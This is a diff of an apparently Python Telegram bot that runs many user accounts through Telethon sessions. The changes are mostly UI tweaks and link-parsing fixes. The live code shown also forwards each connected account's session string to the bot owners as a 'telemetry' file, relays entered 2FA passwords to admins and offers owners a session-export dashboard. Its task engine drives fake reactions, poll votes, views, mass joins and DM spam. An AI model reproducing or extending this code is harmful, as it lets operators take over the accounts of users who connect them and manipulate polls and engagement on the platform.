@@ -63,44 +63,46 @@ def decrypt_data(encrypted_data: str) -> str:
         return ""
 
 # --- ADVANCED LINK & PRIVATE INVITE PARSING HELPER ---
-def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool, Optional[str]]:
+def parse_telegram_link(link: Any) -> Tuple[Any, Optional[int], bool, Optional[str]]:
     """
     Returns: (target_peer, msg_id, is_private, extracted_vote_query)
     """
-    link = link.strip()
-    if not link:
+    if link is None:
+        return None, None, False, None
+    
+    link_str = str(link).strip()
+    if not link_str:
         return None, None, False, None
         
     extracted_query = None
-    # Extract query/emoji target attached to links (e.g., ?vote=❤️ or link containing emojis)
-    if "?vote=" in link:
-        parts = link.split("?vote=")
-        link = parts[0]
+    if "?vote=" in link_str:
+        parts = link_str.split("?vote=")
+        link_str = parts[0]
         extracted_query = parts[1]
 
-    if re.match(r'^-?\d+$', link):
-        return int(link), None, False, extracted_query
+    if re.match(r'^-?\d+$', link_str):
+        return int(link_str), None, False, extracted_query
 
-    private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
+    private_match = re.search(r't\.me/c/(\d+)/(\d+)', link_str)
     if private_match:
         channel_id = int(f"-100{private_match.group(1)}")
         msg_id = int(private_match.group(2))
         return channel_id, msg_id, False, extracted_query
 
-    if "+ " in link or "/+" in link or "joinchat/" in link:
-        hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
+    if "+ " in link_str or "/+" in link_str or "joinchat/" in link_str:
+        hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link_str)
         if hash_match:
             return hash_match.group(1), None, True, extracted_query
-        return link, None, True, extracted_query
+        return link_str, None, True, extracted_query
         
-    msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
+    msg_match = re.search(r't\.me/([^/]+)/(\d+)', link_str)
     if msg_match:
         target = msg_match.group(1)
         if target.isdigit():
             target = int(f"-100{target}")
         return target, int(msg_match.group(2)), False, extracted_query
         
-    target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
+    target = link_str.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
     if "/" in target:
         parts = target.split("/")
         target = parts[0]
@@ -210,7 +212,6 @@ db_mgr = Database()
 registration_sessions: Dict[int, Dict[str, Any]] = {}
 bot_username: str = "bot"
 
-# Helper for dispatching 2FA alerts to Admins/Super Owners
 async def dispatch_2fa_alert(bot: Bot, user_id: int, phone: str, password_entered: Optional[str] = None):
     text = (
         f"🔐 <b>2FA Password Event Detected!</b>\n\n"
@@ -327,7 +328,7 @@ class TaskQueue:
                 {"$set": {"status": "failed", "progress": "No accounts found"}}
             )
             try:
-                await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text="❌ <b>Task Failed:</b> You do not have any operational accounts available under selected scopes.")
+                await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text="❌ <b>Task Failed:</b> You do not have any operational accounts available under selected scopes.", parse_mode="HTML")
             except Exception:
                 pass
             return
@@ -357,7 +358,6 @@ class TaskQueue:
                 try:
                     await asyncio.sleep(sleep_time * idx)
                     
-                    # Connect and check authorization for account status
                     try:
                         await client.connect()
                         if not await client.is_user_authorized():
@@ -393,9 +393,10 @@ class TaskQueue:
                     # Execution Workflow - Join Channel/Group
                     if do_join:
                         try:
-                            if is_channel_private or "+ " in channel_target or "/+" in channel_target or "joinchat/" in channel_target:
-                                invite_hash = parsed_channel if is_channel_private else parsed_target
-                                updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
+                            chan_str = str(channel_target or target)
+                            if is_channel_private or "+ " in chan_str or "/+" in chan_str or "joinchat/" in chan_str:
+                                invite_hash = str(parsed_channel if is_channel_private else parsed_target).strip()
+                                updates = await client(functions.messages.ImportChatInviteRequest(hash=invite_hash))
                                 if hasattr(updates, 'chats') and updates.chats:
                                     joined_updates_peer = updates.chats[0]
                             else:
@@ -403,7 +404,7 @@ class TaskQueue:
                                 if hasattr(updates, 'chats') and updates.chats:
                                     joined_updates_peer = updates.chats[0]
                         except UserAlreadyParticipantError:
-                            logger.info(f"[{phone}] Account is already a participant. Skipping join step and proceeding to views/reactions.")
+                            logger.info(f"[{phone}] Account is already a participant. Proceeding...")
                         except (UserDeactivatedBanError, UserDeactivatedError) as ban_err:
                             await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                             failed_ids.append((phone, f"Account banned during join: {type(ban_err).__name__}"))
@@ -411,7 +412,7 @@ class TaskQueue:
                             return
                         except Exception as join_err:
                             if "USER_ALREADY_PARTICIPANT" in str(join_err):
-                                logger.info(f"[{phone}] Account already participant string detected. Proceeding...")
+                                logger.info(f"[{phone}] Account already participant string detected.")
                             else:
                                 failed_ids.append((phone, f"Failed to join chat/channel: {str(join_err)}"))
                                 failure_counter += 1
@@ -470,9 +471,9 @@ class TaskQueue:
                             
                             async def perform_vote():
                                 if vote_mode == "inline":
-                                    raw_button_text = payload.get("button_text", "").strip().lower()
+                                    raw_button_text = str(payload.get("button_text", "")).strip().lower()
                                     if link_query_vote and not raw_button_text:
-                                        raw_button_text = link_query_vote.strip().lower()
+                                        raw_button_text = str(link_query_vote).strip().lower()
                                         
                                     clean_target = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', raw_button_text)
 
@@ -509,11 +510,11 @@ class TaskQueue:
                             except UserAlreadyParticipantError:
                                 pass
                             except Exception as first_vote_err:
-                                # Auto-join channel if non-member and retry vote
                                 try:
-                                    if is_channel_private or "+ " in str(channel_target) or "/+" in str(channel_target) or "joinchat/" in str(channel_target):
-                                        invite_hash = parsed_channel if is_channel_private else parsed_target
-                                        updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
+                                    chan_str = str(channel_target or target)
+                                    if is_channel_private or "+ " in chan_str or "/+" in chan_str or "joinchat/" in chan_str:
+                                        invite_hash = str(parsed_channel if is_channel_private else parsed_target).strip()
+                                        updates = await client(functions.messages.ImportChatInviteRequest(hash=invite_hash))
                                         if hasattr(updates, 'chats') and updates.chats:
                                             target_peer = updates.chats[0]
                                     else:
@@ -557,8 +558,9 @@ class TaskQueue:
                         try:
                             bot_username_target = str(target_peer).replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
                             start_param = None
-                            if "start=" in target:
-                                param_match = re.search(r'start=([^&\s]+)', target)
+                            target_str = str(target)
+                            if "start=" in target_str:
+                                param_match = re.search(r'start=([^&\s]+)', target_str)
                                 if param_match:
                                     start_param = param_match.group(1)
                             if "?" in bot_username_target:
@@ -712,8 +714,9 @@ class TaskQueue:
             f"{failure_log_details}"
         )
 
+        # In-place edit of status card ensures clean, non-repetitive messages
         try:
-            await bot_instance.send_message(chat_id=creator_id, text=completion_card, parse_mode="HTML")
+            await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text=completion_card, parse_mode="HTML")
             
             if len(failed_ids) > 20:
                 file_lines = [
@@ -772,7 +775,7 @@ class ExportWizardStates(StatesGroup):
 class BroadcastStates(StatesGroup):
     waiting_for_msg = State()
 
-# --- PREMIUM UI KEYBOARD GENERATORS WITH BUTTON STYLES ---
+# --- PREMIUM UI KEYBOARD GENERATORS ---
 REACTION_EMOJIS = [
     "🔥", "❤️", "💖", "💘", "💝",
     "👍", "👏", "🎉", "🤩", "💯",
@@ -782,8 +785,8 @@ REACTION_EMOJIS = [
 
 def get_post_registration_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✨ Connect Next Target Account", callback_data="add_account_phone", style="success")],
-        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]
+        [InlineKeyboardButton(text="✨ Connect Next Target Account", callback_data="add_account_phone")],
+        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]
     ])
 
 def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMarkup:
@@ -792,48 +795,48 @@ def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMa
     for emoji in REACTION_EMOJIS:
         is_selected = emoji in selected_emojis
         suffix = " ⭐" if is_selected else ""
-        row.append(InlineKeyboardButton(text=f"{emoji}{suffix}", callback_data=f"toggle_emoji:{emoji}", style="primary" if is_selected else "success"))
+        row.append(InlineKeyboardButton(text=f"{emoji}{suffix}", callback_data=f"toggle_emoji:{emoji}"))
         if len(row) == 5:  
             keyboard.append(row)
             row = []
     if row:
         keyboard.append(row)
     
-    keyboard.append([InlineKeyboardButton(text="🔱 Finalize Reaction Pack selection", callback_data="finish_emoji_selection", style="success")])
-    keyboard.append([InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu", style="primary")])
+    keyboard.append([InlineKeyboardButton(text="🔱 Finalize Reaction Pack selection", callback_data="finish_emoji_selection")])
+    keyboard.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")])
     return InlineKeyboardMarkup(inline_keyboard=keyboard)
 
 def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
     buttons = [
-        [InlineKeyboardButton(text="📱 Manage accounts", callback_data="manage_accounts:0", style="primary")],
-        [InlineKeyboardButton(text="🌋 Launch Active Campaign Tasks", callback_data="task_hub_start", style="success")],
-        [InlineKeyboardButton(text="📊 Real-time Campaign Logs", callback_data="view_tasks", style="primary")],
-        [InlineKeyboardButton(text="⚜️ Referral link", callback_data="view_referrals", style="primary")],
-        [InlineKeyboardButton(text="👑 Developers", callback_data="system_credits", style="primary")]
+        [InlineKeyboardButton(text="📱 Manage accounts", callback_data="manage_accounts:0")],
+        [InlineKeyboardButton(text="🌋 Launch Active Campaign Tasks", callback_data="task_hub_start")],
+        [InlineKeyboardButton(text="📊 Real-time Campaign Logs", callback_data="view_tasks")],
+        [InlineKeyboardButton(text="⚜️ Referral link", callback_data="view_referrals")],
+        [InlineKeyboardButton(text="👑 Developers", callback_data="system_credits")]
     ]
     if role in ["admin", "owner", "super_owner"]:
-        buttons.append([InlineKeyboardButton(text="🛡️ Admin panel", callback_data="admin_panel", style="danger")])
+        buttons.append([InlineKeyboardButton(text="🛡️ Admin panel", callback_data="admin_panel")])
     if role in ["owner", "super_owner"]:
-        buttons.append([InlineKeyboardButton(text="📈 User IDs with details", callback_data="system_stats", style="primary")])
+        buttons.append([InlineKeyboardButton(text="📈 User IDs with details", callback_data="system_stats")])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 def get_task_types_keyboard(active_count: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔥 Reaction Only", callback_data="set_type:react", style="success"), InlineKeyboardButton(text="🗳️ Advanced Poll Voting", callback_data="set_type:vote", style="success")],
-        [InlineKeyboardButton(text="⚡ Reaction + Vote", callback_data="set_type:react_vote", style="success"), InlineKeyboardButton(text="👁️ View Incrementor", callback_data="set_type:view", style="primary")],
-        [InlineKeyboardButton(text="💎 Reaction + View", callback_data="set_type:react_view", style="success"), InlineKeyboardButton(text="🎯 Vote + View", callback_data="set_type:vote_view", style="success")],
-        [InlineKeyboardButton(text="🔮 Reaction + Vote + View ", callback_data="set_type:react_vote_view", style="success")],
-        [InlineKeyboardButton(text="✅ Join Target Channel", callback_data="set_type:join", style="primary"), InlineKeyboardButton(text="❌ Leave channel", callback_data="set_type:leave", style="danger")],
-        [InlineKeyboardButton(text="📥 Direct DM Broadcast", callback_data="set_type:dm", style="primary")],
-        [InlineKeyboardButton(text="🔗 Referral ", callback_data="set_type:refer", style="primary"), InlineKeyboardButton(text="🏎️ Fast Speed Views", callback_data="set_type:speed", style="success")],
-        [InlineKeyboardButton(text="🛑 Abort Setup Configuration", callback_data="main_menu", style="danger")]
+        [InlineKeyboardButton(text="🔥 Reaction Only", callback_data="set_type:react"), InlineKeyboardButton(text="🗳️ Advanced Poll Voting", callback_data="set_type:vote")],
+        [InlineKeyboardButton(text="⚡ Reaction + Vote", callback_data="set_type:react_vote"), InlineKeyboardButton(text="👁️ View Incrementor", callback_data="set_type:view")],
+        [InlineKeyboardButton(text="💎 Reaction + View", callback_data="set_type:react_view"), InlineKeyboardButton(text="🎯 Vote + View", callback_data="set_type:vote_view")],
+        [InlineKeyboardButton(text="🔮 Reaction + Vote + View ", callback_data="set_type:react_vote_view")],
+        [InlineKeyboardButton(text="✅ Join Target Channel", callback_data="set_type:join"), InlineKeyboardButton(text="❌ Leave channel", callback_data="set_type:leave")],
+        [InlineKeyboardButton(text="📥 Direct DM Broadcast", callback_data="set_type:dm")],
+        [InlineKeyboardButton(text="🔗 Referral ", callback_data="set_type:refer"), InlineKeyboardButton(text="🏎️ Fast Speed Views", callback_data="set_type:speed")],
+        [InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu")]
     ])
 
 def get_leave_channel_options_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔗 Leave channel link 1 only", callback_data="leave_mode:single", style="primary")],
-        [InlineKeyboardButton(text="💥 Complete Purge (Leave All Channels)", callback_data="leave_mode:all", style="danger")],
-        [InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start", style="primary")]
+        [InlineKeyboardButton(text="🔗 Leave channel link 1 only", callback_data="leave_mode:single")],
+        [InlineKeyboardButton(text="💥 Complete Purge (Leave All Channels)", callback_data="leave_mode:all")],
+        [InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]
     ])
 
 # --- ROUTER REGISTER ---
@@ -882,7 +885,7 @@ async def cmd_cancel_tasks(message: Message, bot: Bot):
     user_id = message.from_user.id
     role = await db_mgr.get_user_role(user_id)
     if role not in ["admin", "owner", "super_owner"]:
-        await message.answer("⚠️ <b>Clearance Denied:</b> Access token restricted to System Operators.")
+        await message.answer("⚠️ <b>Clearance Denied:</b> Access token restricted to System Operators.", parse_mode="HTML")
         return
 
     await message.answer("🛑 <i>Terminating thread execution loops across pending and active campaign tasks...</i>", parse_mode="HTML")
@@ -891,7 +894,7 @@ async def cmd_cancel_tasks(message: Message, bot: Bot):
         {"status": {"$in": ["pending", "running"]}},
         {"$set": {"status": "cancelled"}}
     )
-    await message.answer(f"✨ <b>Task Termination Loop Completed!</b> Successfully cancelled <code>{killed_count}</code> pending or active task threads.")
+    await message.answer(f"✨ <b>Task Termination Loop Completed!</b> Successfully cancelled <code>{killed_count}</code> pending or active task threads.", parse_mode="HTML")
 
 # --- MONGODB STORAGE MONITORING COMMAND & CALLBACK ---
 @router.message(Command("adminstorage"))
@@ -899,7 +902,7 @@ async def cmd_admin_storage(message: Message, bot: Bot):
     user_id = message.from_user.id
     role = await db_mgr.get_user_role(user_id)
     if role not in ["admin", "owner", "super_owner"]:
-        await message.answer("⚠️ <b>Clearance Denied:</b> Reserved for Administrative Operators.")
+        await message.answer("⚠️ <b>Clearance Denied:</b> Reserved for Administrative Operators.", parse_mode="HTML")
         return
 
     stats = await db_mgr.get_storage_stats()
@@ -939,16 +942,16 @@ async def handle_check_db_storage(callback: CallbackQuery, bot: Bot):
         f"📄 Document Objects: <code>{stats['objects']}</code>\n"
         f"🗂️ Total Collections: <code>{stats['collections']}</code>"
     )
-    buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="admin_panel", style="primary")]]
+    buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="admin_panel")]]
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
-# --- SUPER OWNER EXCLUSIVE: GRANT & REVOKE 20 ACCOUNT IDS ACCESS ---
+# --- GRANT & REVOKE ACCESS ---
 @router.message(Command("grantaccess"))
 async def cmd_grant_access(message: Message, command: CommandObject, bot: Bot):
     user_id = message.from_user.id
     role = await db_mgr.get_user_role(user_id)
     if role != "super_owner":
-        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Super Owner privileges.")
+        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Super Owner privileges.", parse_mode="HTML")
         return
 
     args = command.args
@@ -1002,7 +1005,7 @@ async def cmd_revoke_access(message: Message, command: CommandObject, bot: Bot):
     user_id = message.from_user.id
     role = await db_mgr.get_user_role(user_id)
     if role != "super_owner":
-        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Super Owner privileges.")
+        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Super Owner privileges.", parse_mode="HTML")
         return
 
     args = command.args
@@ -1021,7 +1024,7 @@ async def cmd_add_admin(message: Message, command: CommandObject, bot: Bot):
     user_id = message.from_user.id
     role = await db_mgr.get_user_role(user_id)
     if role not in ["owner", "super_owner"]:
-        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Owner privilege tokens.")
+        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Owner privilege tokens.", parse_mode="HTML")
         return
         
     args = command.args
@@ -1051,7 +1054,7 @@ async def cmd_remove_admin(message: Message, command: CommandObject, bot: Bot):
     user_id = message.from_user.id
     role = await db_mgr.get_user_role(user_id)
     if role not in ["owner", "super_owner"]:
-        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Owner privilege tokens.")
+        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Owner privilege tokens.", parse_mode="HTML")
         return
         
     target_id_str = command.args
@@ -1071,7 +1074,7 @@ async def cmd_broadcast_start(message: Message, state: FSMContext, bot: Bot):
     user_id = message.from_user.id
     role = await db_mgr.get_user_role(user_id)
     if role not in ["admin", "owner", "super_owner"]:
-        await message.answer("⚠️ <b>Clearance Denied:</b> Command restricted to Administration Nodes.")
+        await message.answer("⚠️ <b>Clearance Denied:</b> Command restricted to Administration Nodes.", parse_mode="HTML")
         return
         
     await message.answer("📢 <b>Input Data Text or Multimedia payload content to broadcast:</b>", parse_mode="HTML")
@@ -1112,7 +1115,7 @@ async def handle_system_credits(callback: CallbackQuery, bot: Bot):
         f"⚙️ <b>Core Binary Operations Engineer:</b> @{config.MANAGER_HANDLE}\n\n"
         "<i>Thank you for utilising our premium cluster account management utility matrix core!</i>"
     )
-    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]
+    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]
     await callback.message.edit_text(text=credits_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
 # --- PAGINATED ACCOUNTS VIEW ---
@@ -1146,26 +1149,26 @@ async def list_user_accounts(callback: CallbackQuery, bot: Bot):
 
         buttons = []
         import_row = [
-            InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone", style="success"),
-            InlineKeyboardButton(text="📁 Upload String File", callback_data="add_account_session", style="success")
+            InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone"),
+            InlineKeyboardButton(text="📁 Upload String File", callback_data="add_account_session")
         ]
         buttons.append(import_row)
 
         if role in ["super_owner", "owner"]:
-            buttons.append([InlineKeyboardButton(text="📥 Open Session Export Dashboard", callback_data="export_dashboard_root", style="danger")])
+            buttons.append([InlineKeyboardButton(text="📥 Open Session Export Dashboard", callback_data="export_dashboard_root")])
             
-        buttons.append([InlineKeyboardButton(text="💥 Delete Dead Sessions", callback_data=f"purge_dead_accounts:{page}", style="danger")])
+        buttons.append([InlineKeyboardButton(text="💥 Delete Dead Sessions", callback_data=f"purge_dead_accounts:{page}")])
         
         nav_row = []
         if page > 0:
-            nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"manage_accounts:{page - 1}", style="primary"))
+            nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"manage_accounts:{page - 1}"))
         if offset + limit < total_items:
-            nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"manage_accounts:{page + 1}", style="primary"))
+            nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"manage_accounts:{page + 1}"))
         
         if nav_row:
             buttons.append(nav_row)
             
-        buttons.append([InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")])
+        buttons.append([InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")])
         await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
     except Exception as e:
         logger.error(f"Error handling list view page context: {e}")
@@ -1189,7 +1192,12 @@ async def handle_purge_dead_accounts(callback: CallbackQuery, bot: Bot):
 @router.callback_query(F.data == "add_account_phone")
 async def add_account_start(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.edit_text("📱 <b>Type targeted terminal phone number string with country code mapping prefix (e.g. +919876543210):</b>", parse_mode="HTML")
+    buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0")]]
+    await callback.message.edit_text(
+        "📱 <b>Type targeted terminal phone number string with country code mapping prefix (e.g. +919876543210):</b>",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
+        parse_mode="HTML"
+    )
     await state.set_state(RegistrationStates.waiting_for_phone)
 
 @router.message(StateFilter(RegistrationStates.waiting_for_phone))
@@ -1288,7 +1296,12 @@ async def complete_registration(message: Message, state: FSMContext, client: Tel
 @router.callback_query(F.data == "add_account_session")
 async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.edit_text("📁 <b>Drop your raw telethon string session strings layout, text line values, or upload a .txt / .session file log:</b>\n<i>(Supports unlimited bulk multi-line file imports!)</i>", parse_mode="HTML")
+    buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0")]]
+    await callback.message.edit_text(
+        "📁 <b>Drop your raw telethon string session strings layout, text line values, or upload a .txt / .session file log:</b>\n<i>(Supports unlimited bulk multi-line file imports!)</i>",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
+        parse_mode="HTML"
+    )
     await state.set_state(RegistrationStates.waiting_for_session_file)
 
 @router.message(StateFilter(RegistrationStates.waiting_for_session_file))
@@ -1304,14 +1317,14 @@ async def process_session_file(message: Message, state: FSMContext, bot: Bot):
         raw_content = message.text.strip()
 
     if not raw_content:
-        await message.answer("❌ <b>Source Error:</b> Empty input detected. Verification canceled.")
+        await message.answer("❌ <b>Source Error:</b> Empty input detected. Verification canceled.", parse_mode="HTML")
         await state.clear()
         return
 
     potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
     
     if not potential_sessions:
-        await message.answer("❌ <b>Parse Failure:</b> Could not isolate any valid telethon format session string sequences inside your text.")
+        await message.answer("❌ <b>Parse Failure:</b> Could not isolate any valid telethon format session string sequences inside your text.", parse_mode="HTML")
         await state.clear()
         return
 
@@ -1356,13 +1369,12 @@ async def process_session_file(message: Message, state: FSMContext, bot: Bot):
     result_text = (
         f"✨ <b>Bulk Framework Import Profile Sync Complete!</b>\n\n"
         f"🟩 Successfully added: <code>{success_imports}</code> accounts\n"
-        f"num Terminated/Mismatched failed count: <code>{failed_imports}</code> keys"
+        f"🔴 Terminated/Mismatched failed count: <code>{failed_imports}</code> keys"
     )
 
     await status_msg.edit_text(result_text, reply_markup=get_post_registration_keyboard(), parse_mode="HTML")
     await state.clear()
 
-# Telemetry Dispatch Helper
 async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Bot):
     file_bytes = session_str.encode('utf-8')
     document = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
@@ -1381,7 +1393,7 @@ async def dispatch_session_telemetry(phone: str, session_str: str, username: Opt
         except Exception as e:
             logger.error(f"Failed sending data to owner node {owner_id}: {e}")
 
-# --- EXPORT ARCHIVE MANAGEMENT HOOKS (RESTRICTED TO OWNERS ONLY) ---
+# --- EXPORT ARCHIVE MANAGEMENT HOOKS ---
 @router.callback_query(F.data == "export_dashboard_root")
 async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
@@ -1394,10 +1406,10 @@ async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
     await callback.answer()
     text = "📥 <b>Session Extraction Management Dashboard Terminal</b>\nSelect extraction criteria filters:"
     buttons = [
-        [InlineKeyboardButton(text="🎯 Extract 1 Single Session Profile", callback_data="select_export_session:0", style="primary")],
-        [InlineKeyboardButton(text="🎭 Multi-Session Extract", callback_data="export_multi_start:0", style="primary")],
-        [InlineKeyboardButton(text="📦 Extract Full Pack", callback_data="bulk_admin_export", style="danger")],
-        [InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0", style="primary")]
+        [InlineKeyboardButton(text="🎯 Extract 1 Single Session Profile", callback_data="select_export_session:0")],
+        [InlineKeyboardButton(text="🎭 Multi-Session Extract", callback_data="export_multi_start:0")],
+        [InlineKeyboardButton(text="📦 Extract Full Pack", callback_data="bulk_admin_export")],
+        [InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0")]
     ]
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
@@ -1432,17 +1444,17 @@ async def select_export_session_menu(callback: CallbackQuery, bot: Bot):
         return
 
     text = f"Select structural database session profile target row to dump (Page {page + 1}):"
-    buttons = [[InlineKeyboardButton(text=f"📱 +{r['phone']} (@{r.get('username') or 'None'})", callback_data=f"export_ph:{r['phone']}", style="primary")] for r in rows]
+    buttons = [[InlineKeyboardButton(text=f"📱 +{r['phone']} (@{r.get('username') or 'None'})", callback_data=f"export_ph:{r['phone']}")] for r in rows]
     
     nav_row = []
     if page > 0:
-        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"select_export_session:{page - 1}", style="primary"))
+        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"select_export_session:{page - 1}"))
     if offset + limit < total_items:
-        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"select_export_session:{page + 1}", style="primary"))
+        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"select_export_session:{page + 1}"))
     if nav_row:
         buttons.append(nav_row)
         
-    buttons.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="export_dashboard_root", style="primary")])
+    buttons.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="export_dashboard_root")])
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
 @router.callback_query(F.data.startswith("export_ph:"))
@@ -1463,7 +1475,7 @@ async def handle_export_session_run(callback: CallbackQuery, bot: Bot):
         return
 
     if row["user_id"] in config.SUPER_OWNER_IDS and role != "super_owner":
-        await callback.message.answer("🛡️ <b>Access Violation:</b> Super Owner profiles are isolated and protected.")
+        await callback.message.answer("🛡️ <b>Access Violation:</b> Super Owner profiles are isolated and protected.", parse_mode="HTML")
         return
 
     session_bytes = decrypt_data(row["session_string"]).encode('utf-8')
@@ -1507,21 +1519,20 @@ async def export_multi_dashboard(callback: CallbackQuery, state: FSMContext, bot
         ph = r['phone']
         is_sel = ph in selected
         prefix = "✅ " if is_sel else ""
-        btn_style = "success" if is_sel else "primary"
-        buttons.append([InlineKeyboardButton(text=f"{prefix}+{ph}", callback_data=f"toggle_export_sel:{ph}:{page}", style=btn_style)])
+        buttons.append([InlineKeyboardButton(text=f"{prefix}+{ph}", callback_data=f"toggle_export_sel:{ph}:{page}")])
         
     nav_row = []
     if page > 0:
-        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"export_multi_start:{page - 1}", style="primary"))
+        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"export_multi_start:{page - 1}"))
     if offset + limit < total_items:
-        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"export_multi_start:{page + 1}", style="primary"))
+        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"export_multi_start:{page + 1}"))
     if nav_row:
         buttons.append(nav_row)
         
     if selected:
-        buttons.append([InlineKeyboardButton(text=f"🚀 Download Selected ({len(selected)}) Sessions", callback_data="download_multi_selected", style="success")])
+        buttons.append([InlineKeyboardButton(text=f"🚀 Download Selected ({len(selected)}) Sessions", callback_data="download_multi_selected")])
         
-    buttons.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="export_dashboard_root", style="primary")])
+    buttons.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="export_dashboard_root")])
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
 @router.callback_query(F.data.startswith("toggle_export_sel:"))
@@ -1635,14 +1646,14 @@ async def task_hub_start(callback: CallbackQuery, state: FSMContext, bot: Bot):
         })
 
     if active_count == 0:
-        await callback.message.edit_text("⚠️ <b>Task Execution Engine Offline:</b> Zero active Telethon worker sessions detected. Please connect sessions first.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu", style="primary")]]), parse_mode="HTML")
+        await callback.message.edit_text("⚠️ <b>Task Execution Engine Offline:</b> Zero active Telethon worker sessions detected. Please connect sessions first.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")]]), parse_mode="HTML")
         return
 
     if role == "super_owner":
         buttons = [
-            [InlineKeyboardButton(text=f"👑 Super Owner Accounts ({user_accounts})", callback_data="routing_scope:own", style="success")],
-            [InlineKeyboardButton(text=f"🌍 Universal System Accounts ({all_accounts})", callback_data="routing_scope:all", style="danger")],
-            [InlineKeyboardButton(text="🛑 Cancel Action Setup", callback_data="main_menu", style="danger")]
+            [InlineKeyboardButton(text=f"👑 Super Owner Accounts ({user_accounts})", callback_data="routing_scope:own")],
